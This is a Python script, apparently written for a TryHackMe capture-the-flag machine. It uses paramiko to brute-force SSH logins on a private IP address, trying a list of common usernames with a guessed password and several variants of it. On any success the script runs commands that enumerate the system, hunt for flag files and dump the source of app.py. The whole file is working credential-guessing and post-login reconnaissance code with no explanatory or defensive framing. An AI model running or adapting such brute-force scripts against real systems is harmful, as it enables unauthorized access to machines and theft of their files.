import paramiko
import socket

HOST = "10.114.139.59"

# Try SSH login with cupid_arrow_2026!!! as password
# Common usernames for CTF
usernames = [
    "cupid", "love", "valentine", "admin", "root", "user",
    "anonymous", "letter", "flask", "app", "web", "www-data",
    "ubuntu", "ctf", "tryhackme", "thm"
]
password = "cupid_arrow_2026!!!"

print(f"=== SSH brute force with password: {password} ===")

for user in usernames:
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(HOST, port=22, username=user, password=password, timeout=5,
                      allow_agent=False, look_for_keys=False)
        print(f"  [!!!] SUCCESS: {user}:{password}")
        
        # Run commands
        stdin, stdout, stderr = client.exec_command("id; whoami; pwd")
        print(f"  id: {stdout.read().decode()}")
        
        stdin, stdout, stderr = client.exec_command("ls -la /")
        print(f"  ls /: {stdout.read().decode()}")
        
        stdin, stdout, stderr = client.exec_command("cat /home/*/flag* /root/flag* /tmp/flag* 2>/dev/null; find / -name 'flag*' -o -name '*.flag' 2>/dev/null | head -20")
        print(f"  flags: {stdout.read().decode()}")
        
        stdin, stdout, stderr = client.exec_command("cat /home/*/app.py /opt/*/app.py /var/www/*/app.py 2>/dev/null; find / -name 'app.py' 2>/dev/null | head -10")
        out = stdout.read().decode()
        print(f"  app.py: {out[:2000]}")
        
        client.close()
        break
    except paramiko.AuthenticationException:
        print(f"  {user}:{password} -> Auth failed")
    except Exception as e:
        print(f"  {user}:{password} -> {e}")

# Also try cupid_arrow_2026 without !!!
print(f"\n=== Try without exclamation marks ===")
for pwd in ["cupid_arrow_2026", "arrow2026", "cupid2026", "CupidArrow2026"]:
    for user in usernames:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(HOST, port=22, username=user, password=pwd, timeout=5,
                          allow_agent=False, look_for_keys=False)
            print(f"  [!!!] SUCCESS: {user}:{pwd}")
            stdin, stdout, stderr = client.exec_command("id; whoami")
            print(f"  {stdout.read().decode()}")
            client.close()
            break
        except paramiko.AuthenticationException:
            pass
        except Exception as e:
            print(f"  {user}:{pwd} -> {e}")
            break

print("\nDone.")
